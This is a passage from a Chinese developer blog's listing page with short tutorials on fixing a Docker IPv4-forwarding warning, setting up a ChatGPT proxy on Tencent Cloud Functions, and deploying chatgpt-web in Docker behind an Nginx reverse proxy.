<p>实体类没有类型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// @Document指定当前类是索引对象。indexName:索引名称;shards:创建索引时的分片数;replicas:创建索引时的备份数</span><br><span class="line">@Document(indexName = &quot;book_&quot;, shards = 5, replicas = 1)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-03-14T15:49:50.000Z" title="2023/3/14 23:49:50">2023-03-14</time>发表</span><span class="level-item"><time dateTime="2023-05-23T03:42:11.107Z" title="2023/5/23 11:42:11">2023-05-23</time>更新</span><span class="level-item">3 分钟读完 (大约399个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/03/14/%E3%80%90Docker%E3%80%91%E5%85%B3%E4%BA%8Edocker%E6%9C%8D%E5%8A%A1%E6%8A%A5%E9%94%99WARNING%20IPv4%20forwarding%20is%20disabled.%20Networking%20will%20not%20work/">【Docker】关于docker服务报错WARNING IPv4 forwarding is disabled. Networking will not work</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h3 id="docker关于docker服务报错warning-ipv4-forwarding-is-disabled-networking-will-not-work"><a class="markdownIt-Anchor" href="#docker关于docker服务报错warning-ipv4-forwarding-is-disabled-networking-will-not-work">#</a> 【Docker】关于 docker 服务报错 WARNING IPv4 forwarding is disabled. Networking will not work</h3>
<p><strong>注意：在这里强调，强制进入或者进入镜像，进入后会引起 yum install 和 wget 等不能使用</strong></p>
<h2 id="一docker-运行直接报错"><a class="markdownIt-Anchor" href="#一docker-运行直接报错">#</a> <strong>一，docker 运行直接报错</strong></h2>
<p><strong>报错：</strong></p>
<p>[root@localhost /]# docker run -it ubuntu /bin/bash</p>
<p><em>WARNING: IPv4 forwarding is disabled. Networking will not work.</em></p>
<p><img src="https://brath.oss-cn-shanghai.aliyuncs.com/pigo/05472c924858164c6df96734a709fd3b.png" alt="img"></p>
<p>1. 解决方式：</p>
<p>第一步：在宿主机上执行 echo “net.<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ipv4&amp;spm=1001.2101.3001.7020">ipv4</a>.ip_forward=1” &gt;&gt;/usr/lib/sysctl.d/00-system.conf</p>
<p><img src="https://brath.oss-cn-shanghai.aliyuncs.com/pigo/56fe262e97ffdd8fb3992692af566dd2.png" alt="img"></p>
<p>2. 第二步：重启 network 和 docker 服务</p>
<p>[root@localhost /]# systemctl restart network &amp;&amp; systemctl restart docker</p>
<p>3. 第三步：验证是否成功</p>
<p><img src="https://brath.oss-cn-shanghai.aliyuncs.com/pigo/fe9d3a924773707b13542350b4f77b2e.png" alt="img"></p>
<p>可见完美解决问题。</p>
<h2 id="二如果你是docker容器运行镜像的时候也是报这种错误相对应得也是重启一下docker就可以完美解决了了"><a class="markdownIt-Anchor" href="#二如果你是docker容器运行镜像的时候也是报这种错误相对应得也是重启一下docker就可以完美解决了了">#</a> 二，如果你是 docker 容器运行镜像的时候也是报这种错误，相对应得也是重启一下 docker 就可以完美解决了了。</h2>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-03-07T02:12:13.000Z" title="2023/3/7 10:12:13">2023-03-07</time>发表</span><span class="level-item"><time dateTime="2023-04-26T02:22:12.911Z" title="2023/4/26 10:22:12">2023-04-26</time>更新</span><span class="level-item">4 分钟读完 (大约581个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/03/07/%E3%80%90ChatGPT%E3%80%91%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0%E5%85%8D%E8%B4%B9%E9%83%A8%E7%BD%B2%E5%9B%BD%E5%86%85%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8ChatGPT%E4%BB%A3%E7%90%86%EF%BC%8C%E8%A7%A3%E5%86%B3%E7%BD%91%E7%BB%9C%E4%B8%8D%E5%8F%AF%E7%94%A8%E5%8F%8A1020%E7%AD%89%E9%97%AE%E9%A2%98/">【chatGPT】利用腾讯云函数免费部署国内直接使用ChatGPT代理，解决网络不可用及1020等问题</a></p><div class="content"><h1 id="chatgpt利用腾讯云函数免费部署国内直接使用chatgpt代理解决网络不可用及1020等问题"><a class="markdownIt-Anchor" href="#chatgpt利用腾讯云函数免费部署国内直接使用chatgpt代理解决网络不可用及1020等问题">#</a> 【chatGPT】利用腾讯云函数免费部署国内直接使用 ChatGPT 代理，解决网络不可用及 1020 等问题</h1>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h2 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h2>
<p>在 Github 上发现一个项目，可以利用腾讯云提供的云函数，一分钟就能搭建好一台可以直接访问 ChatGPT 的代理，关键还是免费的。今天就来一起折腾它。</p>
<h2 id="项目"><a class="markdownIt-Anchor" href="#项目">#</a> 项目</h2>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/geekr-dev/openai-proxy">https://github.com/geekr-dev/openai-proxy</a></p>
<h2 id="教程"><a class="markdownIt-Anchor" href="#教程">#</a> 教程</h2>
<p>可以直接看官方文字教程，如果是新手，可以按我图文教程</p>
<h5 id="第一步"><a class="markdownIt-Anchor" href="#第一步">#</a> 第一步：</h5>
<p>​	登录腾讯控制台：<a target="_blank" rel="noopener" href="https://console.cloud.tencent.com/scf/list">https://console.cloud.tencent.com/scf/list</a></p>
<p>​	如果之前没使用腾讯云函数，会提示授权</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/image-20230420085936706.png" alt="image-20230420085936706"></p>
<h5 id="第二步前往访问管理"><a class="markdownIt-Anchor" href="#第二步前往访问管理">#</a> 第二步：前往访问管理</h5>
<p>​	<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/image-20230420085957003.png" alt="image-20230420085957003"></p>
<h5 id="第三步新建函数记得选择非大陆地区哟"><a class="markdownIt-Anchor" href="#第三步新建函数记得选择非大陆地区哟">#</a> 第三步：新建函数，记得选择<strong>非大陆</strong>地区哟</h5>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/image-20230420090015818.png" alt="image-20230420090015818"></p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/image-20230420090031428.png" alt="image-20230420090031428"></p>
<h5 id="上传github项目中的zip文件"><a class="markdownIt-Anchor" href="#上传github项目中的zip文件">#</a> 上传 Github 项目中的 ZIP 文件</h5>
<h5 id="第四步高级配置"><a class="markdownIt-Anchor" href="#第四步高级配置">#</a> 第四步：高级配置</h5>
<p>上传完 ZIP 文件，接着下拉，找到高级配置，点进去编辑<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/image-20230420090114681.png" alt="image-20230420090114681"></p>
<p>点高级配置的最右边的编辑按钮</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/image-20230420090132944.png" alt="image-20230420090132944"></p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/image-20230420090140465.png" alt="image-20230420090140465"></p>
<h5 id="第五步获取代理地址"><a class="markdownIt-Anchor" href="#第五步获取代理地址">#</a> 第五步：获取代理地址</h5>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/image-20230420090255336.png" alt="image-20230420090255336"></p>
<p>不要 &quot;/release&quot; 路径，只要取子域名部分就可以了</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/image-20230420090309398.png" alt="image-20230420090309398"></p>
<p>这时候访问路径内容和 api.open.com 的结果是一至的了。</p>
<p><strong>至此：已经有了海外域名的代理地址了。</strong></p>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-03-04T12:23:03.000Z" title="2023/3/4 20:23:03">2023-03-04</time>发表</span><span class="level-item"><time dateTime="2023-04-26T02:22:15.829Z" title="2023/4/26 10:22:15">2023-04-26</time>更新</span><span class="level-item">9 分钟读完 (大约1359个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/03/04/%E3%80%90ChatGPT%E3%80%91%E5%9F%BA%E4%BA%8EDocker%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2%E8%87%AA%E5%B7%B1%E7%9A%84ChatGPT/">【chatGPT】基于Docker如何快速部署自己的ChatGPT</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="基于docker如何快速部署自己的chatgpt"><a class="markdownIt-Anchor" href="#基于docker如何快速部署自己的chatgpt">#</a> 基于 Docker 如何快速部署自己的 ChatGPT</h1>
<h2 id="背景"><a class="markdownIt-Anchor" href="#背景">#</a> 背景</h2>
<p>随着<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=OpenAI&amp;spm=1001.2101.3001.7020"> OpenAI</a> 在 2022 年底发布的 LLM 模型 - ChatGPT 展现出的强大效果，ChatGPT 无疑成为了当下炙手可热的明星模型。</p>
<p>现有的基于<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=GPT&amp;spm=1001.2101.3001.7020"> GPT</a> 的开源项目已经非常多，本文以现有的高热度 github 开源项目<a target="_blank" rel="noopener" href="https://github.com/Chanzhaoyu/chatgpt-web"> chatgpt-web</a> 为例，教大家简单快速地搭建属于自己的 ChatGPT。</p>
<h2 id="chatgpt-web"><a class="markdownIt-Anchor" href="#chatgpt-web">#</a> ChatGPT-Web</h2>
<p>chatgpt-web 项目中的部署教程已经非常完整，本文不再过多解释。</p>
<p>仅以 Docker 部署为例</p>
<p>前置条件</p>
<ul>
<li>本地或者服务器应该具有 Docker 环境</li>
<li>具有 ChatGPT 帐号</li>
</ul>
<p>以 token 模式为例，请求 chatgpt web 版本，免费但稍微具有延迟</p>
<p><strong>Step1. 找到你帐号的 token</strong></p>
<p>点击 https://chat.openai.com/api/auth/session，获取你帐号的 token，并记录他</p>
<p><strong>Step2. 运行 docker</strong></p>
<p>按需配置访问 Web 页面的密码，Token、超时等信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run --name chatgpt-web -d -p 127.0.0.1:3888:3002 --<span class="built_in">env</span> OPENAI_ACCESS_TOKEN=your_access_token --<span class="built_in">env</span> AUTH_SECRET_KEY=you_secret_key chenzhaoyu94/chatgpt-web</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p><strong>Step3. 访问 localhost:3002 查看效果</strong><br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/b6ea40d61cb741129cc1d98af9633d18.png" alt="在这里插入图片描述"><br>
在上述步骤中我们无需进行任何代理，就可以直接与 GPT 交流，使用 API 方式同理。当然了，根据项目作者的介绍，<strong>使用 API 时需要进行代理自建</strong>。</p>
<p>如果你只是在本地部署给自己使用，那么以上 3 步就满足了需求，如果想要在公网访问，或者像 App 一样访问你的 ChatGPT，那么请接着往下看。</p>
<h2 id="nginx反向代理"><a class="markdownIt-Anchor" href="#nginx反向代理">#</a> Nginx 反向代理</h2>
<p>以宝塔面板为例，我们在服务器上拉起 docker 镜像后，可以通过 <code>ip:port</code>  进行访问</p>
<p>但通常来说我们的网站带有域名，以笔者所使用的腾讯云服务器为例</p>
<p>前置条件</p>
<ul>
<li>拥有一个域名</li>
<li>拥有一台云服务器</li>
</ul>
<p><strong>Step1. SSL 证书</strong></p>
<p>首先在云产品中找到 SSL 证书，点击我的证书 - 免费证书 - 申请免费证书</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/34d88a1248ea4158ba5e2e6a07ab0a67.png" alt="在这里插入图片描述"></p>
<p>填写申请的域名，申请成功之后，点击下载，下载 nginx 格式的即可</p>
<p><strong>Step2. 配置域名 SSL</strong></p>
<p>在宝塔面板中选择 - 网站 - 添加站点</p>
<p>填写刚刚申请 SSL 证书的域名，选择纯静态，其余默认，点击确定即可</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/9ece432796a34885adc258df4bc25555.png" alt="在这里插入图片描述"></p>
<p><strong>Step3. 配置证书</strong></p>
<p>点击添加好的网站，然后点击 SSL，填入刚刚下载的文件中的 <code>key</code>  和 <code>pem</code> <br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/852f85f818444491bc4b8e04248b9a4b.png" alt="在这里插入图片描述"></p>
<p>配置完成后点击保存</p>
<p><strong>Step4. 配置 DNS 解析</strong></p>
<p>在云产品中搜索 - 云解析 - 选择 DNS 解析 DNSPod</p>
<p>点击我的域名 - 添加记录</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/383f44e9fe714847ab5c5f2079d81982.png" alt="在这里插入图片描述"></p>
<p>填入刚刚申请的域名，如果带有前缀，则第一个红框填入你的域名前缀，<a target="_blank" rel="noopener" href="http://xn--www-eo8er22f.baidu.com">比如 www.baidu.com</a>，则这里填 www</p>
<p>第二个红框填写你的服务器 ip，或者你的 CDN 域名</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/2882e7602c324fc4a9a5520262c23a0a.png" alt="在这里插入图片描述"></p>
<p><strong>Step5. 配置反向代理</strong></p>
<p>在宝塔面板中，点击刚刚添加的网站，点击反向代理，填入刚刚 docker 启动时的宿主机端口<br>
<img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/abbf944aab284d368e63d28b61024d7f.png" alt="在这里插入图片描述"></p>
<p>如上文中的 3888</p>
<p>以上配置完成之后，访问 https:// 你的域名就可以了～</p>
<h2 id="pwa支持"><a class="markdownIt-Anchor" href="#pwa支持">#</a> PWA 支持</h2>
<p>PWA 技术可以让我们访问网站能够拥有访问 App 一般的体验，在 chatgpt-web 中已经内嵌，但默认是关闭的</p>
<p>我们可以通过设置启动时的参数 <code>-env VITE_GLOB_APP_PWA=true</code>  将他打开</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run --name chatgpt-web -d -p 127.0.0.1:3888:3002 --<span class="built_in">env</span> OPENAI_ACCESS_TOKEN=your_access_token --<span class="built_in">env</span> AUTH_SECRET_KEY=you_secret_key --<span class="built_in">env</span> VITE_GLOB_APP_PWA=<span class="literal">true</span> chenzhaoyu94/chatgpt-web</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>部署成功之后，我们再到手机上访问该网站时便可以保存他在桌面了。</p>
<p>默认的 PWA 图标和全局用户信息配置在项目中，即使在网页可以修改当前登陆者的用户信息，在清除 Cookie 之后便会还原，如果你想定制这两种信息，请拉下 chatgpt-web 项目进行镜像自定义</p>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/">上一页</a></div><div class="pagination-next"><a href="/page/3/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link is-current" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/10/">10</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-06-12T04:13:41.000Z">2023-06-12</time></p><p class="title"><a href="/2023/06/12/%E3%80%90%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91%E3%80%91%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E7%AC%AC%E4%B8%89%E6%9C%9F-%E5%85%AC%E4%BC%97%E5%8F%B7%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%AE%9E%E6%88%98%E5%88%86%E4%BA%AB/">【公众号开发】公众号技术分享第三期-公众号事件处理-设计模式实战分享</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-06-06T00:13:41.000Z">2023-06-06</time></p><p class="title"><a href="/2023/06/06/%E3%80%90%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91%E3%80%91%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E7%AC%AC%E4%BA%8C%E6%9C%9F-%E5%85%AC%E4%BC%97%E5%8F%B7%E6%A8%A1%E6%9D%BF%E6%B6%88%E6%81%AF-%E6%A8%A1%E6%9D%BF%E6%A8%A1%E5%BC%8F%E5%AE%9E%E6%88%98%E5%88%86%E4%BA%AB/">【公众号开发】公众号技术分享第二期-公众号模板消息-模板模式实战分享</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-06-06T00:10:41.000Z">2023-06-06</time></p><p class="title"><a href="/2023/06/06/%E3%80%90%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91%E3%80%91%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E7%AC%AC%E4%B8%80%E6%9C%9F-%E5%A6%82%E4%BD%95%E6%B3%A8%E5%86%8C%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%B9%B3%E5%8F%B0%E5%B9%B6%E4%BD%BF%E7%94%A8%E5%85%AC%E4%BC%97%E5%8F%B7%E6%A8%A1%E6%9D%BF%E6%B6%88%E6%81%AF/">【公众号开发】公众号技术分享第一期-如何注册微信公众平台并使用公众号模板消息</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-06-05T17:10:41.000Z">2023-06-06</time></p><p class="title"><a href="/2023/06/06/%E3%80%90Sentinel%E3%80%91Docker%E6%90%AD%E5%BB%BASentinel/">【Sentinel】Docker搭建Sentinel</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-06-05T07:25:21.000Z">2023-06-05</time></p><p class="title"><a href="/2023/06/05/%E3%80%90Git%E3%80%91Github%E6%8F%90%E4%BA%A4%E4%BB%A3%E7%A0%81%E9%81%87%E5%88%B0%E9%94%99%E8%AF%AF%EF%BC%9AERROR%20You%E2%80%98re%20using%20an%20RSA%20key%20with%20SHA-1,%20which%20is%20no%20longer%20allowed/">【Git】Github提交代码遇到错误：ERROR You‘re using an RSA key with SHA-1, which is no longer allowed</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/"><span class="level-start"><span class="level-item">2023</span></span><span class="level-end"><span class="level-item tag">41</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/"><span class="level-start"><span class="level-item">2022</span></span><span class="level-end"><span class="level-item tag">61</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/"><span class="level-start"><span class="level-item">2021</span></span><span class="level-end"><span class="level-item tag">43</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/"><span class="level-start"><span class="level-item">2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">InterviewCoder</p><p class="is-size-6 is-block">面试记官方公众号</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">150</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://mp.weixin.qq.com/s/jWs6lLHl5L-atXJhHc4YvA" target="_blank" rel="noopener">关注我</a></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://brath.cloud/me.png" alt="Brath"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Brath</p><p class="is-size-6 is-block">技能改变人生，知识改变命运。</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国·江苏·无锡</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">150</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Guoqing815" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Guoqing815"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Gitee" href="https://gitee.com/Guoqing-Li"><i class="fab fa-gitee"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://schokolade.cn/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">泠灵(特别鸣谢)</span></span><span class="level-right"><span class="level-item tag">schokolade.cn</span></span></a></li><li><a class="level is-mobile" href="https://github.com/Guoqing815/interview" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">面试记Github</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li><li><a class="level is-mobile" href="https://www.pgyer.com/interview_app_release" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">面试记App(Android)</span></span><span class="level-right"><span class="level-item tag">www.pgyer.com</span></span></a></li><li><a class="level is-mobile" href="https://gitee.com/Guoqing-Li" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Gitee(码云)</span></span><span class="level-right"><span class="level-item tag">gitee.com</span></span></a></li><li><a class="level is-mobile" href="https://blog.csdn.net/Brath?type=blog" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">CSDN</span></span><span class="level-right"><span class="level-item tag">blog.csdn.net</span></span></a></li><li><a class="level is-mobile" href="https://juejin.cn/user/settings/profile" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">掘金</span></span><span class="level-right"><span class="level-item tag">juejin.cn</span></span></a></li><li><a class="level is-mobile" href="https://oss.console.aliyun.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">AliCloud(阿里云)</span></span><span class="level-right"><span class="level-item tag">oss.console.aliyun.com</span></span></a></li><li><a class="level is-mobile" href="https://cloud.tencent.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">TencentCloud(腾讯云)</span></span><span class="level-right"><span class="level-item tag">cloud.tencent.com</span></span></a></li><li><a class="level is-mobile" href="https://www.zhipin.com/web/user/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">BOSS</span></span><span class="level-right"><span class="level-item tag">www.zhipin.com</span></span></a></li><li><a class="level is-mobile" href="https://www.bilibili.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bilibili(B站)</span></span><span class="level-right"><span class="level-item tag">www.bilibili.com</span></span></a></li></ul></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://brath.cloud/avatar.png" alt="Brath-Blog" height="28"></a><p class="is-size-7"><span>&copy; 2023 Brath</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p><p class="is-size-7">© 2030</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
